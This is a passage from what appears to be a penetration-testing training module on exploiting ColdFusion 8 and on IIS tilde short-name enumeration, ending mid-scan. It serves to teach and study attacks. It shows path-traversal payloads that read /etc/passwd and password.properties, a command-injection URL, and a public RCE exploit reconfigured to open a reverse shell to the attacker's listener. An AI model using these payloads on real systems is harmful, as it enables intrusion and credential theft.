<p>Navigating around the structure a bit shows lots of interesting info, from files with a clear <code>.cfm</code> extension to error messages and login pages.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/coldfusion/cfindex.png" alt=""></p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/coldfusion/CFIDE.png" alt=""></p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/coldfusion/CFError.png" alt=""></p>
<p>The <code>/CFIDE/administrator</code> path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that <code>ColdFusion 8</code> is running on the server.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/coldfusion/CF8.png" alt=""></p>
<hr>
<p>Note: There is a possibility that the Virtual Machine will take extended periods of time to respond (up to 90s), please be patient</p>
<h2 id="attacking-coldfusion">Attacking ColdFusion</h2>
<hr>
<p>Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits. <code>Searchsploit</code> is a command-line tool for <code>searching and finding exploits</code> in the Exploit Database. It is part of the Exploit Database project, a non-profit organisation providing a public repository of exploits and vulnerable software. <code>Searchsploit</code> searches through the Exploit Database and returns a list of exploits and their relevant details, including the name of the exploit, its description, and the date it was released.</p>
<p><strong>Searchsploit</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - <span class="hljs-string">'probe.cfm'</span> Cross-Site Scripting                                       | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">36067.</span>txt
Adobe ColdFusion - Directory Traversal                                                    | multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">14641.</span>py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">16985.</span>rb
Adobe ColdFusion <span class="hljs-number">11</span> - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows<span class="hljs-regexp">/remote/</span><span class="hljs-number">50781.</span>txt
Adobe Coldfusion <span class="hljs-number">11.0</span><span class="hljs-number">.03</span><span class="hljs-number">.292866</span> - BlazeDS Java Object Deserialization Remote Code Executi | windows<span class="hljs-regexp">/remote/</span><span class="hljs-number">43993.</span>py
Adobe ColdFusion <span class="hljs-number">2018</span> - Arbitrary File Upload                                             | multiple<span class="hljs-regexp">/webapps/</span><span class="hljs-number">45979.</span>txt
Adobe ColdFusion <span class="hljs-number">6</span><span class="hljs-regexp">/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/</span>webapps/<span class="hljs-number">29567.</span>txt
Adobe ColdFusion <span class="hljs-number">7</span> - Multiple Cross-Site Scripting Vulnerabilities                        | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">36172.</span>txt
Adobe ColdFusion <span class="hljs-number">8</span> - Remote Command Execution (RCE)                                       | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">50057.</span>py
Adobe ColdFusion <span class="hljs-number">9</span> - Administrative Authentication Bypass                                 | windows<span class="hljs-regexp">/webapps/</span><span class="hljs-number">27755.</span>txt
Adobe ColdFusion <span class="hljs-number">9</span> - Administrative Authentication Bypass (Metasploit)                    | multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">30210.</span>rb
Adobe ColdFusion &lt; <span class="hljs-number">11</span> Update <span class="hljs-number">10</span> - XML External Entity Injection                           | multiple<span class="hljs-regexp">/webapps/</span><span class="hljs-number">40346.</span>py
Adobe ColdFusion APSB13<span class="hljs-number">-03</span> - Remote Multiple Vulnerabilities (Metasploit)                 | multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">24946.</span>rb
Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">'/administrator/enter.cfm'</span> Query String Cross-Site Script | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">33170.</span>txt
Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">'/wizards/common/_authenticatewizarduser.cfm'</span> Query Strin | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">33167.</span>txt
Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">'/wizards/common/_logintowizard.cfm'</span> Query String Cross-S | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">33169.</span>txt
Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">'administrator/logviewer/searchlog.cfm?startRow'</span> Cross-Si | cfm<span class="hljs-regexp">/webapps/</span><span class="hljs-number">33168.</span>txt
------------------------------------------------------------------------------------------ ---------------------------------
<span class="hljs-string">Shellcodes:</span> No Results
</code></pre>
<p>As we know, the version of ColdFusion running is <code>ColdFusion 8</code>, and there are two results of interest. The <code>Adobe ColdFusion - Directory Traversal</code> and the <code>Adobe ColdFusion 8 - Remote Command Execution (RCE)</code> results.</p>
<hr>
<h3 id="directory-traversal">Directory Traversal</h3>
<p><code>Directory/Path Traversal</code> is an attack that allows an attacker to access files and directories outside of the intended directory in a web application. The attack exploits the lack of input validation in a web application and can be executed through various <code>input fields</code> such as <code>URL parameters</code>, <code>form fields</code>, <code>cookies</code>, and more. By manipulating input parameters, the attacker can traverse the directory structure of the web application and <code>access sensitive files</code>, including <code>configuration files</code>, <code>user data</code>, and other system files. The attack can be executed by manipulating the input parameters in ColdFusion tags such as <code>CFFile</code> and <code>CFDIRECTORY,</code> which are used for file and directory operations such as uploading, downloading, and listing files.</p>
<p>Take the following ColdFusion code snippet:</p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">cfdirectory</span> <span class="hljs-attr">directory</span>=<span class="hljs-string">"#ExpandPath('uploads/')#"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fileList"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cfloop</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"fileList"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"uploads/#fileList.name#"</span>&gt;</span>#fileList.name#<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">cfloop</span>&gt;</span>
</code></pre>
<p>In this code snippet, the ColdFusion <code>cfdirectory</code> tag lists the contents of the <code>uploads</code> directory, and the <code>cfloop</code> tag is used to loop through the query results and display the filenames as clickable links in HTML.</p>
<p>However, the <code>directory</code> parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the <code>directory</code> parameter to access files outside the <code>uploads</code> directory.</p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.cfm?directory=../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/&amp;file=passwd</span>
</code></pre>
<p>In this example, the <code>../</code> sequence is used to navigate the directory tree and access the <code>/etc/passwd</code> file outside the intended location.</p>
<p><code>CVE-2010-2861</code> is the <code>Adobe ColdFusion - Directory Traversal</code> exploit discovered by <code>searchsploit</code>. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.</p>
<ul>
<li><code>CFIDE/administrator/settings/mappings.cfm</code></li>
<li><code>logging/settings.cfm</code></li>
<li><code>datasources/index.cfm</code></li>
<li><code>j2eepackaging/editarchive.cfm</code></li>
<li><code>CFIDE/administrator/enter.cfm</code></li>
</ul>
<p>These ColdFusion files are vulnerable to a directory traversal attack in <code>Adobe ColdFusion 9.0.1</code> and <code>earlier versions</code>. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the <code>locale parameter</code> in these specific ColdFusion files.</p>
<p>With this vulnerability, attackers can access files outside the intended directory by including <code>../</code> sequences in the file parameter. For example, consider the following URL:</p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/CFIDE/</span>administrator<span class="hljs-regexp">/settings/m</span>appings.cfm?locale=en
</code></pre>
<p>In this example, the URL attempts to access the <code>mappings.cfm</code> file in the <code>/CFIDE/administrator/settings/</code> directory of the web application with a specified <code>en</code> locale. However, a directory traversal attack can be executed by manipulating the URL&#39;s locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.</p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/CFIDE/</span>administrator<span class="hljs-regexp">/settings/m</span>appings.cfm?locale=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd
</code></pre>
<p>In this example, the <code>../</code> sequences have been used to replace a valid <code>locale</code> to traverse the directory structure and access the <code>passwd</code> file located in the <code>/etc/</code> directory.</p>
<p>Using <code>searchsploit</code>, copy the exploit to a working directory and then execute the file to see what arguments it requires.</p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https:/</span><span class="hljs-regexp">/www.exploit-db.com/exploits</span><span class="hljs-regexp">/14641
     Path: /usr</span><span class="hljs-regexp">/share/exploitdb</span><span class="hljs-regexp">/exploits/multiple</span><span class="hljs-regexp">/remote/</span><span class="hljs-number">14641</span>.py
File <span class="hljs-symbol">Type:</span> Python script, ASCII text executable

Copied EDB-ID <span class="hljs-comment">#14641's path to the clipboard</span>
</code></pre>
<p><strong>Coldfusion - Exploitation</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ cp /usr</span><span class="hljs-regexp">/share/exploitdb</span><span class="hljs-regexp">/exploits/multiple</span><span class="hljs-regexp">/remote/</span><span class="hljs-number">14641</span>.py .
root@htb[<span class="hljs-regexp">/htb]$ python2 14641.py 

usage: 14641.py &lt;host&gt; &lt;port&gt; &lt;file_path&gt;
example: 14641.py localhost 80 ../</span>../../../../../../<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">password</span>.<span class="hljs-title">properties</span></span>
<span class="hljs-keyword">if</span> successful, the file will be printed
</code></pre>
<p>The <code>password.properties</code> file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like <code>database connections</code>, <code>mail servers</code>, <code>LDAP servers</code>, and other resources that require authentication. By storing encrypted passwords in this file, ColdFusion can automatically retrieve and use them to authenticate with the respective services without requiring the manual entry of passwords each time. The file is usually in the <code>[cf_root]/lib</code> directory and can be managed through the ColdFusion Administrator.</p>
<p>By providing the correct parameters to the exploit script and specifying the path of the desired file, the script can trigger an exploit on the vulnerable endpoints mentioned above. The script will then output the result of the exploit attempt:</p>
<p><strong>Coldfusion - Exploitation</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ python2 14641.py 10.129.204.230 8500 "../</span>../../../../../../../ColdFusion8/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">password</span>.<span class="hljs-title">properties</span>"</span>

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.<span class="hljs-symbol">cfm:</span>
------------------------------
<span class="hljs-comment">#Wed Mar 22 20:53:51 EET 2017</span>
rdspassword=<span class="hljs-number">0</span>IA/F[[E&gt;[$_6&amp; \\Q&gt;[K\=XP  \n
password=<span class="hljs-number">2</span>F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=<span class="hljs-literal">true</span>
------------------------------
...
</code></pre>
<p>As we can see, the contents of the <code>password.properties</code> file have been retrieved, proving that this target is vulnerable to <code>CVE-2010-2861</code>.</p>
<hr>
<h3 id="unauthenticated-rce">Unauthenticated RCE</h3>
<p>Unauthenticated Remote Code Execution (<code>RCE</code>) is a type of security vulnerability that allows an attacker to <code>execute arbitrary code</code> on a vulnerable system <code>without requiring authentication</code>. This type of vulnerability can have severe consequences, as it will <code>enable an attacker to take complete control of the system</code> and potentially steal sensitive data or cause damage to the system.</p>
<p>The difference between a <code>RCE</code> and an <code>Unauthenticated Remote Code Execution</code> is whether or not an attacker needs to provide valid authentication credentials in order to exploit the vulnerability. An RCE vulnerability allows an attacker to execute arbitrary code on a target system, regardless of whether or not they have valid credentials. However, in many cases, RCE vulnerabilities require that the attacker already has access to some part of the system, either through a user account or other means.</p>
<p>In contrast, an unauthenticated RCE vulnerability allows an attacker to execute arbitrary code on a target system without any valid authentication credentials. This makes this type of vulnerability particularly dangerous, as an attacker can potentially take over a system or execute malicious commands without any barrier to entry.</p>
<p>In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. Take the following code:</p>
<p>Code: html</p>
<pre><code class="lang-html">&lt;cfset <span class="hljs-keyword">cmd</span><span class="bash"> = <span class="hljs-string">"#cgi.query_string#"</span>&gt;
</span>&lt;cfexecute name=<span class="hljs-string">"cmd.exe"</span> arguments=<span class="hljs-string">"/c #cmd#"</span> timeout=<span class="hljs-string">"5"</span>&gt;
</code></pre>
<p>In the above code, the <code>cmd</code> variable is created by concatenating the <code>cgi.query_string</code> variable with a command to be executed. This command is then executed using the <code>cfexecute</code> function, which runs the Windows <code>cmd.exe</code> program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the <code>cmd</code> variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the <code>cgi.query_string</code> variable, and it would be executed by the server.</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-comment"># Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" &gt; C:\compromise.txt</span>

<span class="hljs-attribute">http</span>://www.example.com/index.cfm?<span class="hljs-number">%3</span>B<span class="hljs-number">%20</span>echo<span class="hljs-number">%20</span><span class="hljs-number">%22</span>This<span class="hljs-number">%20</span>server<span class="hljs-number">%20</span>has<span class="hljs-number">%20</span>been<span class="hljs-number">%20</span>compromised<span class="hljs-number">%21</span><span class="hljs-number">%22</span><span class="hljs-number">%20</span><span class="hljs-number">%3</span>E<span class="hljs-number">%20</span>C<span class="hljs-number">%3</span>A<span class="hljs-number">%5</span>Ccompromise.txt
</code></pre>
<p>This URL includes a semicolon (<code>%3B</code>) at the beginning of the query string, which can allow for the execution of multiple commands on the server. This could potentially append legitimate functionality with an unintended command. The included <code>echo</code> command prints a message to the console, and is followed by a redirection command to write a file to the <code>C:</code> directory with a message indicating that the server has been compromised.</p>
<p>An example of a ColdFusion Unauthenticated RCE attack is the <code>CVE-2009-2265</code> vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:</p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/CFIDE/</span>scripts<span class="hljs-regexp">/ajax/</span>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>cfm<span class="hljs-regexp">/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=</span>
</code></pre>
<p><code>CVE-2009-2265</code> is the vulnerability identified by our earlier searchsploit search as <code>Adobe ColdFusion 8 - Remote Command Execution (RCE)</code>. Pull it into a working directory.</p>
<p><strong>Searchsploit</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ searchsploit -p <span class="hljs-number">50057</span>
<span class="hljs-symbol">
  Exploit:</span> Adobe ColdFusion <span class="hljs-number">8</span> - Remote Command Execution (RCE)
<span class="hljs-symbol">      URL:</span> https:<span class="hljs-comment">//www.exploit-db.com/exploits/50057</span>
<span class="hljs-symbol">     Path:</span> <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/exploitdb/</span>exploits<span class="hljs-meta-keyword">/cfm/</span>webapps/<span class="hljs-number">50057.</span>py
File Type: Python script, ASCII text executable

Copied EDB-ID <span class="hljs-meta">#50057root@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .</span>
</code></pre>
<p>A quick <code>cat</code> review of the code indicates that the script needs some information. Set the correct information and launch the exploit.</p>
<p><strong>Exploit Modification</strong></p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">if</span> <span class="hljs-attr">__name__</span> == '__main__':
    <span class="hljs-comment"># Define some information</span>
    <span class="hljs-attr">lhost</span> = '<span class="hljs-number">10.10</span>.<span class="hljs-number">14.55</span>' <span class="hljs-comment"># HTB VPN IP</span>
    <span class="hljs-attr">lport</span> = <span class="hljs-number">4444</span> <span class="hljs-comment"># A port not in use on localhost</span>
    <span class="hljs-attr">rhost</span> = <span class="hljs-string">"10.129.247.30"</span> <span class="hljs-comment"># Target IP</span>
    <span class="hljs-attr">rport</span> = <span class="hljs-number">8500</span> <span class="hljs-comment"># Target Port</span>
    <span class="hljs-attr">filename</span> = uuid.uuid4().hex
</code></pre>
<p>The exploit will take a bit of time to launch, but it eventually will return a functional remote shell</p>
<p><strong>Exploitation</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> python3 <span class="hljs-number">50057.</span>py 

<span class="hljs-function"><span class="hljs-title">Generating</span></span> a payload...
Payload size: <span class="hljs-number">1497</span> bytes
Saved as: <span class="hljs-number">1269</span>fd7bd2b341fab6751ec31bbfb610.jsp

<span class="hljs-function"><span class="hljs-title">Priting</span></span> request...
Content-type: multipart/form-data; boundary=<span class="hljs-number">77</span>c732cb2f394ea79c71d42d50274368
Content-length: <span class="hljs-number">1698</span>

-<span class="hljs-number">-77</span>c732cb2f394ea79c71d42d50274368

&lt;SNIP&gt;

-<span class="hljs-number">-77</span>c732cb2f394ea79c71d42d50274368--


<span class="hljs-function"><span class="hljs-title">Sending</span></span> request <span class="hljs-keyword">and</span> printing response...


        &lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
            window.parent.OnUploadCompleted( <span class="hljs-number">0</span>, <span class="hljs-string">"/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt"</span>, <span class="hljs-string">"1269fd7bd2b341fab6751ec31bbfb610.txt"</span>, <span class="hljs-string">"0"</span> );
        &lt;/script&gt;


<span class="hljs-function"><span class="hljs-title">Printing</span></span> some information <span class="hljs-keyword">for</span> debugging...
lhost: <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.55</span>
lport: <span class="hljs-number">4444</span>
rhost: <span class="hljs-number">10.129</span><span class="hljs-number">.247</span><span class="hljs-number">.30</span>
rport: <span class="hljs-number">8500</span>
payload: <span class="hljs-number">1269</span>fd7bd2b341fab6751ec31bbfb610.jsp

<span class="hljs-function"><span class="hljs-title">Deleting</span></span> the payload...

<span class="hljs-function"><span class="hljs-title">Listening</span></span> <span class="hljs-keyword">for</span> connection...

<span class="hljs-function"><span class="hljs-title">Executing</span></span> the payload...
Ncat: Version <span class="hljs-number">7.92</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span>
Ncat: Listening on :::<span class="hljs-number">4444</span>
Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">4444</span>
Ncat: Connection from <span class="hljs-number">10.129</span><span class="hljs-number">.247</span><span class="hljs-number">.30</span>.
Ncat: Connection from <span class="hljs-number">10.129</span><span class="hljs-number">.247</span><span class="hljs-number">.30</span>:<span class="hljs-number">49866.</span>
</code></pre>
<p><strong>Reverse Shell</strong></p>
<p>Attacking ColdFusion</p>
<pre><code class="lang-cmd-session">Microsoft Windows [Version <span class="hljs-number">6.1</span>.<span class="hljs-number">7600</span>]
Copyright (c) <span class="hljs-number">2009</span> Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;dir
dir
 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
 Volume Serial Number is <span class="hljs-number">5</span>C03-<span class="hljs-number">76</span>A8

 Directory of C:\ColdFusion8\runtime\bin

<span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">08</span>:<span class="hljs-number">53</span> ��    &lt;DIR&gt;          .
<span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">08</span>:<span class="hljs-number">53</span> ��    &lt;DIR&gt;          ..
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> java2wsdl<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">19</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">09</span>:<span class="hljs-number">59</span> ��         <span class="hljs-number">2.629</span>.<span class="hljs-number">632</span> jikes<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> jrun<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">71.680</span> jrunsvc<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��             <span class="hljs-number">5.120</span> jrunsvcmsg<span class="hljs-selector-class">.dll</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> jspc<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">08</span>:<span class="hljs-number">53</span> ��             <span class="hljs-number">1.804</span> jvm<span class="hljs-selector-class">.config</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> migrate<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">34.816</span> portscan<span class="hljs-selector-class">.dll</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> sniffer<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">78.848</span> WindowsLogin<span class="hljs-selector-class">.dll</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> wsconfig<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">22</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">08</span>:<span class="hljs-number">53</span> ��             <span class="hljs-number">1.013</span> wsconfig_jvm<span class="hljs-selector-class">.config</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> wsdl2java<span class="hljs-selector-class">.exe</span>
<span class="hljs-number">18</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2008</span>  <span class="hljs-number">11</span>:<span class="hljs-number">11</span> ��            <span class="hljs-number">64.512</span> xmlscript<span class="hljs-selector-class">.exe</span>
              <span class="hljs-number">15</span> File(s)      <span class="hljs-number">3.339</span>.<span class="hljs-number">009</span> bytes
               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">1.432</span>.<span class="hljs-number">776.704</span> bytes free
</code></pre>
<p>\</p>
<h2 id="iis-tilde-enumeration">IIS Tilde Enumeration</h2>
<hr>
<p>IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the <code>8.3 format</code>) on some versions of Microsoft Internet Information Services (IIS) web servers. This method takes advantage of a specific vulnerability in IIS, resulting from how it manages short file names within its directories.</p>
<p>When a file or folder is created on an IIS server, Windows generates a short file name in the <code>8.3 format</code>, consisting of eight characters for the file name, a period, and three characters for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.</p>
<p>The tilde (<code>~</code>) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder&#39;s short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.</p>
<p>IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.</p>
<p>The enumeration process starts by sending requests with various characters following the tilde:</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~a</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~b</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~c</span>
...
</code></pre>
<p>Assume the server contains a hidden directory named SecretDocuments. When a request is sent to <code>http://example.com/~s</code>, the server replies with a <code>200 OK</code> status code, revealing a directory with a short name beginning with &quot;s&quot;. The enumeration process continues by appending more characters:</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~se</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~sf</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~sg</span>
...
</code></pre>
<p>For the request <code>http://example.com/~se</code>, the server returns a <code>200 OK</code> status code, further refining the short name to &quot;se&quot;. Further requests are sent, such as:</p>
<pre><code class="lang-http"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~sec</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~sed</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/~see</span>
...
</code></pre>
<p>The server delivers a <code>200 OK</code> status code for the request <code>http://example.com/~sec</code>, further narrowing the short name to &quot;sec&quot;.</p>
<p>Continuing this procedure, the short name <code>secret~1</code> is eventually discovered when the server returns a <code>200 OK</code> status code for the request <code>http://example.com/~secret</code>.</p>
<p>Once the short name <code>secret~1</code> is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.</p>
<p>For instance, if the short name <code>secret~1</code> is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/secret~1/</span>somefile.txt
http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/secret~1/</span>anotherfile.docx
</code></pre>
<p>The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/secret~1/</span>somefi~<span class="hljs-number">1</span>.txt
</code></pre>
<p>In 8.3 short file names, such as <code>somefi~1.txt</code>, the number &quot;1&quot; is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde (<code>~</code>) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.</p>
<p>For example, if two files named <code>somefile.txt</code> and <code>somefile1.txt</code> exist in the same directory, their 8.3 short file names would be:</p>
<ul>
<li><code>somefi~1.txt</code> for <code>somefile.txt</code></li>
<li><code>somefi~2.txt</code> for <code>somefile1.txt</code></li>
</ul>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>The initial phase involves mapping the target and determining which services are operating on their respective ports.</p>
<p><strong>Nmap - Open ports</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ nmap -p- -sV -sC --open <span class="hljs-number">10.129</span><span class="hljs-number">.224</span><span class="hljs-number">.91</span>

Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2023-03-14 19:44 GMT</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.224</span><span class="hljs-number">.91</span>
Host is up (<span class="hljs-number">0.011</span>s latency).
Not <span class="hljs-string">shown:</span> <span class="hljs-number">65534</span> filtered tcp ports (no-response)
Some closed ports may be reported <span class="hljs-keyword">as</span> filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
<span class="hljs-number">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">7.5</span>
| http-<span class="hljs-string">methods:</span> 
|_  Potentially risky <span class="hljs-string">methods:</span> TRACE
